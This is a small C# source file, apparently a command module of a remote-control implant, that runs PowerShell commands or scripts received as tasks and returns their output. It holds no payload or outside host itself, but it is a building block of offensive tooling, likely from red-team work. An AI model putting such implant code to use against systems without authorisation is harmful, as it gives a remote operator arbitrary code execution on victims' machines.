using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;

namespace Agent.Commands
{
    public class RunPowershell : AgentCommand
    {
        public override string Name => "run-powershell";

        public override string Execute(AgentTask task)
        {
            if (task.FileBytes is null)
            {
                if (task.Args is null || task.Args.Length == 0)
                {
                    return "No Powershell command string or script provided.";
                }
                var args = string.Join(" ", task.Args);
                return Internal.Execute.ExecutePowershellCommand(args);
            } else
            {
                return Internal.Execute.ExecutePowershellScript(task.FileBytes);
            }
            
        }
    }
}
